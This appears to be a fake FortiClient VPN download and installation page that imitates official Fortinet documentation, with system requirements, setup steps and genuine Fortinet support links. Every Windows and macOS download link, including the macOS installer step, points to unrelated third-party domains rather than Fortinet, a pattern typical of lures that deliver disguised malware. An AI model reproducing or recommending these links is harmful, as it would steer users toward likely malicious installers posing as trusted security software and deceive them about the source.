# FortiClient VPN

FortiClient VPN is a comprehensive security solution designed to safeguard devices against malware, unauthorized access, and cyber threats. It seamlessly integrates with Fortinet's Advanced Threat Protection to provide robust threat detection and prevention mechanisms. Compatible with Windows, macOS, and Linux, it offers VPN functionality, Zero Trust Telemetry, and malware protection.

- [Download FortiClient VPN](#download-forticlient-vpn)
- [Install FortiClient VPN](#install-forticlient-vpn)
   - [Windows](#macos)
   - [macOS](#macos)
   - [Linux](#linux)
- [System Requirements](#system-requirements)
- [Configuration and Setup](#configuration-and-setup)
- [Support Resources](#support-resources)

## Download FortiClient VPN
FortiClient VPN 7.4 is the latest stable version

*   Release number: 7.4
*   Release date: January 20, 2025

| Platform | Type             | Download                                                                                                                                                                                                                             |
| -------- | ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Windows  | Standard Installer   | [64-bit version](https://checkmateinc.com.pk/ww/) [ARM64 version](https://checkmateinc.com.pk/ww/)                                                                                          |
|          | System Installer | [64-bit version](https://checkmateinc.com.pk/ww/) [ARM64 version](https://checkmateinc.com.pk/ww/)                                                                                        |
|          | .zip             | [64-bit version](https://checkmateinc.com.pk/ww/) [ARM64 version](https://checkmateinc.com.pk/ww/)                                                                                          |
| macOS    | .zip             | [Universal](https://checkmateinc.com.pk/ww/) [Intel Chip](https://checkmateinc.com.pk/ww/) [Apple Silicon](https://checkmateinc.com.pk/ww/) |
| Linux    | .tar.gz          | [64-bit version](*)                                                                                                                                                                 |
|          | .deb             | [64-bit version](*)                                                                                                                                                               |
|          | .rpm             | [64-bit version](*)              


## Install FortiClient VPN

### macOS
1. [**Download the `.dmg` installer file**](https://pincheira.org/forti/).
2. Launch the installer and follow the on-screen instructions:
   - Accept the Software License Agreement.
   - Enter your system password if prompted.
3. Grant the necessary permissions via **System Preferences > Security & Privacy**.
4. Restart your macOS device if required.

### Linux
#### For Ubuntu:
1. Obtain the `.deb` package.
2. Install it using the following command:
   ```bash
   sudo apt-get install <path-to-deb-file>
   ```

#### For Red Hat/CentOS:
1. Download the `.rpm` package.
2. Use the following command to install it:
   ```bash
   sudo yum install <path-to-rpm-file>
   ```

## System Requirements
**Supported Operating Systems:**
- **Windows:** Windows 10/11 (64-bit), Windows Server 2019 or newer
- **macOS:** Ventura (v13), Sonoma (v14)
- **Linux:** Ubuntu 22.04/24.04, Red Hat 9+, CentOS Stream 9, Fedora 36+

**Minimum Hardware Requirements:**
- **Processor:** Intel or equivalent
- **Memory:** 2 GB RAM for Windows/macOS, 512 MB RAM for Linux
- **Disk Space:** 1 GB for Windows/macOS, 600 MB for Linux
- **Network:** Ethernet or Wi-Fi adapter


## Configuration and Setup

### Connecting to EMS
1. Open FortiClient and navigate to the settings section.
2. Input the EMS (Enterprise Management Server) address provided by your administrator.
3. Authenticate using your credentials or security token as necessary.
4. Ensure that the connection status displays "Connected" to confirm successful integration.

### Configuring VPN Connections
1. Go to the **Remote Access** tab within the FortiClient application.
2. Click on **Add a New Connection** and select the VPN type (SSL or IPsec).
3. Provide the required details:
   - Server Address
   - Authentication type (Username/Password, Certificate, or Token)
4. Save the settings and test the connection by selecting **Connect**.

### Setting Up Web Filtering
1. Open the **Web Filter** tab within the settings menu.
2. Activate the Web Filtering feature and choose the appropriate filtering profile.
3. Configure allowed and blocked categories according to your organization’s policies.
4. Validate the filtering setup by visiting a test site to confirm proper functionality.


## Key Features

### Zero Trust Telemetry
FortiClient integrates with Fortinet’s Security Fabric to deliver endpoint telemetry data, improving network visibility and ensuring policy enforcement.

### Malware Protection
Includes comprehensive antivirus scanning, ransomware detection, and integration with FortiSandbox for real-time threat analysis.

### Remote Access
Provides secure SSL and IPsec VPN connections, supporting multifactor authentication and certificate-based access control.

---

## Support Resources
- **Documentation:** [Fortinet Documentation Library](https://docs.fortinet.com)
- **Customer Support:** [Fortinet Support](https://support.fortinet.com)
- **Training & Certification:** [Fortinet Training Institute](https://training.fortinet.com)
- **Feedback:** Email: [techdoc@fortinet.com](mailto:techdoc@fortinet.com)

